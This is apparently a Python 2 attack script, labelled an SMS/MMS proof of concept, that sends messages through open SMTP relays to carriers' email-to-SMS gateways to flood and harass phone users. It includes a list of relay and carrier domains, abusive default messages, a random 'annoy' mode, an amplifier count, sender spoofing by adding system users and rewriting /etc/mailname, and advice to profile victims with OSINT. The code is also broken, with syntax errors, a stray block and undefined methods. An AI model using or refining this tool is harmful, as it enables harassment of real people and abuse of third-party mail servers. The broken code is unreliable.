#!/usr/bin/env python
import os
import sys
import time
import random
import string
# SMS / MMS PoC
# Use open smtp relay as victim host, and target cellphone users
# Something I am tired of getting, so by making it stupid skiddy easy
# hopefully the people who offer these services will fix it

# special note - using verizon SMS and creating a user on a system
# that impersonates an telephone number as a username, it sends 2 msgs
# for every SMS sent, 1 a SMS and the other an Email .. MMS
#
# you should edit and include your own List[] of open SMTP relays
# The more you have included the more will send, 1 SMS per count, per relay ...
#
openrelays = ["gforl.com","gshapartments.com","hmtrucking.com","jwpumps.com"]
#
# you sould edit and include you own Dictionary{} of Subject lines to use
# this is just a default example
#
subjects = {1: "This is the shit!", 2: "Who could have guessed?", 3: "Not your daddys Marijuana", 4: "You mother wont approve!"}
#
# you sould edit and include you own Dictionary{} of Message Bodies to use
# this is just a default example
#
messages = {1:"this sucks", 2:"your poor",3:"your a drop out",4:"you have no future", 5:"your lifes a SMesSMTP"}
#
# you sould edit and include you own Dictionary{} of uploaded files to use
# this is just a default example
#
uploads = {1:"/var/lib/veil-evasion/go/doc/gopher/pencil/gopherrunning.jpg"}
#
# you sould edit and include you own Dictionary{} of Cellular Providers to use
# this is just a default example
#
providers = {1:"advantagepaging.com",2:"airtouch.net",3:"airtouchpaging.com",4:"alltelmessage.com"}
#
# Nothing to edit from here on, unless you care to read and work on the code, hope you help!
#
#############################################################################
#
# helper class for app usage 
#
class help:
 #
 def __init__(self):
  pass
 #
 def general(self):
  print "\n\t\t~[~{~(~> SMesSMTP <~)~}~]~\n"
  print "[!] Basic Example:\n"
  print "\t[-] Example: " + str(sys.argv[0]) + "{Target} {Count} {Carrier} {Subject} {Message} {Username} "
  print "\t[-] Example: " + str(sys.argv[0]) + " 1234567890 1 100 'Hi, Dude!' 'been a while ...' 'default'"
  print "\t\t[*] Sends Subject: 'Hi, Dude!', with the body 'been a while ...' one time to victim 1234567890 on carrier 100"
  print ""
 #
 def advanced(self):
  print "\n\t\t~[~{~(~> SMesSMTP <~)~}~]~\n"
  print "Advanced Description:\n"
  print "\t[-] Example: " + str(sys.argv[0]) + "{Target} {Count} {Carrier} {Subject} {Message} {Username} "
  print "\t[-] Example: " + str(sys.argv[0]) + " 1234567890 1 100 'Hi, Dude!' 'been a while ...' 'default'"
  print "\t\t[*] Sends Subject: 'Hi, Dude!', with the body 'been a while ...' one time to victim 1234567890 on carrier 100"
  print ""
  print "\t[-] {Target}:"
  print "\t\t[*] Can be a file containing a list of cellular phone numbers"
  print "\t\t[*] Can be a single cellular telephone number to be targeted"
  print "\t[-] {Count}:"
  print "\t\t[*] This is an amplifier, if you have 10 open relays it will send 10 SMS/MMS to the victim!"
  print "\t\t[*] In the same way if you use a single open relay, it will send only 1 SMS/MMS"
  print "\t[-] {Subject:"
  print "\t\t[*] This is the subject line the victim will recieve"
  print "\t\t\t[!] The subject var takes different type of input : {FILE descriptor/'Random'/'Annoy'/STDIN}"
  print "\t[-] {Message}:"
  print "\t\t[*] This is the body of the message the victim will recieve"
  print "\t\t\t[!] The message var takes different type of input : {FILE descriptor/'Random'/'Annoy'/STDIN}"
  print "\t[-] {Carrier:"
  print "\t\t[*] This is the domain which handels the Email to SMS gateway for the victim"
  print "\t\t[*] You should research the victim with OSINT to identy the users netork"
  print "\t[-] {Username}:"
  print "\t\t[*] This is used to change the appearance of the username displayed to the victim user in the SMS/MMS"
  print "\t\t[*] You do not need to set this option, however - it will require 'root' level permissions"
  print "\t\t[*] As well the user may have to add or delete users as needed to have successful operations"
  print "\t\t\t[!] The Username var takes different type of input : {FILE descriptor/'Random'/STDIN}"
#  
#
#help().general()
#help().advanced()
#
#############################################################################
#
# diagnostic class for the main application
class diag:
 #
 def __init__(self):
  pass
 # display information about the first variables taken at the commandline
 def firstgetvars(self):
  print "----------------------------"  # diagnostics
  print "\t[-] Target: " + str(target)  # diagnostics
  print "\t[-] Count: " + str(count)  # diagnostics
  print "\t[-] Subject: " + str(subject)  # diagnostics
  print "\t[-] Message: " + str(msg)  # diagnostics
  print "\t[-] Carrier: " + str(carrier)  # diagnostics
  print "\t[-] Username: " + str(username)  # diagnostics
  print "----------------------------"  # diagnostics
 # display inofmration about the sencod phase variable of the application
 def secondgetvars(self):
  print "----------------------------"  # diagnostics
  print "\t[-] Target: " + str(target)  # diagnostics
  print "\t[-] Count: " + str(count)  # diagnostics
  print "\t[-] Subject: " + str(subject)  # diagnostics
  print "\t[-] Message: " + str(msg)  # diagnostics
  print "\t[-] Carrier: " + str(carrier)  # diagnostics
  print "\t[-] Username: " + str(username)  # diagnostics
  print "\t[-] Openrelay: " + str(openrelay)  # diagnostics
  print "----------------------------"  # diagnostics
#
#
#diag().firstgetvars()
#diag().secondgetvars()
#
#############################################################################
#
class userinput:
 #
 def __init__(self):
  pass
 #
 def getvars():
  try:
   target = str(sys.argv[1])
   try:
    count = str(sys.argv[2])
   except Exception as nocount:
    if str(diag).lower() in ["yes","on",1,"true","enabled"]
     print "No Count was provided at command line " + str(nocount)
    self.help.advanced()
   try:
    subject = "".join(str(sys.argv[4]))
   except Exception as nosubject:
    if str(diag).lower() in ["yes","on",1,"true","enabled"]
     print "No Subject line was provided at command line " + str(nosubject)
    self.help.advanced()
   try:
    msg = "".join(str(sys.argv[5]))
   except Exception as nomsg:
    if str(diag).lower() in ["yes","on",1,"true","enabled"]
     print "No Message body was provided at command line " + str(nomsg)
    self.help.advanced()
   try:
    choice = str(sys.argv[3])
   except Exception as nocarrier:
    if str(diag).lower() in ["yes","on",1,"true","enabled"]
     print "No Carrier number was provided at command line " + str(nocarrier)
    self.help.advanced()
   try:
    username = str(sys.argv[6])
   except Exception as nocarrier:
    if str(diag).lower() in ["yes","on",1,"true","enabled"]
     print "No Carrier number was provided at command line " + str(nocarrier)
    self.help.advanced()
  except Exception:
   if str(diag).lower() in ["yes","on",1,"true","enabled"]
    self.diag.firstgetvars()  # diagnostics
   self.help.general()
   sys.exit(0)
#
#############################################################################
#
# generator class for the annoy switches
class generate:
 #
 def __init__(self):
  pass
 #
 def id_generator(self, idgsize=16, idgchars=string.ascii_uppercase + string.digits):
  return ''.join(random.choice(idgchars) for _ in range(idgsize))
 #
 def annoy_generator(self, agsize=random.choice(range(50)), agchars=string.ascii_uppercase + string.digits):
  return ''.join(random.choice(agchars) for _ in range(agsize))
#
# usage instructions
#
#generate().id_generator()
#generate().annoy_generator()
#
#############################################################################
#
class randomness:
 def __init__(self):
  pass
 #
 def rsubject(self):
  return random.choice(subjects.values())
 #
 def rmsg(self):
  return random.choice(messages.values())
#
# usage instructions:
#
#randomness().rsubject()
#randomness().rmsg()
#
#############################################################################
#
#subject = "annoy"
#msg = "annoy"
#username = "random"
#
#
class confset:
 #
 def __init__(self):
  pass
 #
 def confsub(self, subject):
  if str(subject).lower() == "random":
   return randomness().rsubject()
  if str(subject).lower() == "annoy":
    return generate().annoy_generator()
 #
 def confmsg(self, msg):
  if str(msg).lower() == "random":
   return randomness.rmsg()
  if str(msg).lower() == "annoy":
   return generate().annoy_generator()
  if str(msg).lower() == "diag":  #useful to help identify open relays that work in this app
   return str(openrelay).lower()
 #
 def confuser(self, username):
  if str(username).lower() == "random":
   return generate().id_generator()
#
# usage instructions:  
#confset().confsub(subject)
#confset().confmsg(msg)
#confset().confuser(username)
#print subject
#print msg
#print username
#
#############################################################################
#
  if str(diag).lower() in ["yes","on",1,"true","enabled"]:
   diag.secondgetvars()
   print "About to execute system commands to modify Exim configuration"
  os.system("echo "+str(openrelay)+" > /etc/mailname")
  os.system("/etc/init.d/exim4 restart")
  time.sleep(1)
  if str(diag).lower() in ["yes","on",1,"true","enabled"]:
   print "Executed commands and restarted Exim, proceed with application"

confset().configapp(subject)
#
#############################################################################
#
class phase1:
 #
 def __init__(self):
  pass
 #
 def kickstart(self):
  if str(username).lower() == "random":
   username = generators.id_generator()
   os.system("useradd " + str(username))
  msg = "".join(str(sys.argv[5]))
  subject = "".join(str(sys.argv[4]))
  time.sleep(1)
 #
 def cleanup(self):
  # remove random username
  if str(sys.argv[6]) == "random": 
   os.system("deluser " + str(username))
   username = "random"
  msg = "".join(str(sys.argv[5]))
  subject = "".join(str(sys.argv[4]))
  time.sleep(1)
#
#############################################################################
#
class phase2:

 def __init__(self):
  pass

 def procesor():
  #for provider in providers:
  #       print str(provider) + " : " + str(providers[provider])
  #print "----------------------------------"   # diagnostics
  nc = str(providers[int(carrier)])
  #print "Nc: " +str(nc) + " - ", type(nc)  # diagnostics
  #print "----------------------------------"  # diagnostics
  #print "\t[-] Please select a provider number from the list provided"  # diagnostics
  for x in xrange(int(count)):
   if str(msg) == "annoy":
    msg = str(annoy_generator())
   if str(diag).lower() in ["yes","on",1,"true","enabled"]
    print "Body Contents: " + str(msg)
   if str(subject) == "annoy":
    subject = str(annoy_generator())
   if str(diag).lower() in ["yes","on",1,"true","enabled"]
    print "Subject Contents: " + str(subject)
   if choice == "108":
    cmd = 'echo \"'+msg+'\" | mutt -s \"'+str(subject)+'\" '+ target +'@'+str(nc).strip()+' -a ' + str(upload)
   else:
    cmd = 'echo \"'+msg+'\" | mail -s \"'+ subject +'\" '+ target +'@'+str(nc).strip()
   if str(diag).lower() in ["yes","on",1,"true","enabled"]
    print(str(cmd))
   os.popen(cmd)
   msg = "".join(str(sys.argv[5]))
   subject = "".join(str(sys.argv[4]))
   time.sleep(1)
   if str(diag).lower() in ["yes","on",1,"true","enabled"]
    print "End of msg for loop"
#
#############################################################################
#
for openrelay in openrelays:
 confset.configapp()
 phase1.kickstart()
 phase2.processor()
